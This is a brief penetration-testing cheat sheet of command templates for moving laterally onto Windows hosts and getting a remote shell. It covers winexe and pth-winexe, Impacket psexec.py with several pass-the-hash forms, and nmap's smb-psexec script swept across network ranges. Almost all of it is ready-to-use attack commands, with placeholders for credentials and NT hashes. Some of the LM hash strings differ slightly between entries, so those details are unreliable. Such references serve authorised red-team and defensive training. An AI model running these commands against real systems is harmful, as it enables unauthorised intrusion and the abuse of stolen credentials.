# Unix Shell

Search Tag(s): #lateral-movement #psexec #impacket #windows

## 01 - Samba Suite Utils

```
$ winexe -U <domain>/<username>%<password> //<IP> <cmd.exe | powershell.exe>
```

Pass the Hash

```
$ pth-winexe -U <domain>/<username>%aad3b435b51404eeaad3b435b51404ee:<nt_hash> //<IP> <cmd.exe | powershell.exe>
```

## 02 - Impacket

```
$ psexec.py [<domain>/]<username>:<password>@<IP> [-codecs <codec>]
```

- Pass the Hash

```
$ psexec.py <username>@<IP> -hashes <ntlm_hash> [-codecs <codec>]

$ psexec.py [<domain>/]<username>@<IP> -hashes 0000000000000000000000000000000:<nt_hash>

$ psexec.py [<domain>/]<username>@<IP> -hashes aad3b435b51404eeaa3b435b51404ee:<nt_hash>

$ psexec.py [<domain>/]<username>@<IP> -hashes :<nt_hash>
```

## 03 - Network Mapper

```
$ nmap -p 445 -Pn --script smb-psexec --script-args 'smbuser=<username>,smbhash=<nt_hash>' <IP>/<CIDR>

$ sudo nmap -p U:137,T:139 -Pn -sUS --script smb-psexec --script-args 'smbuser=<username>,smbhash=<nt_hash>'
```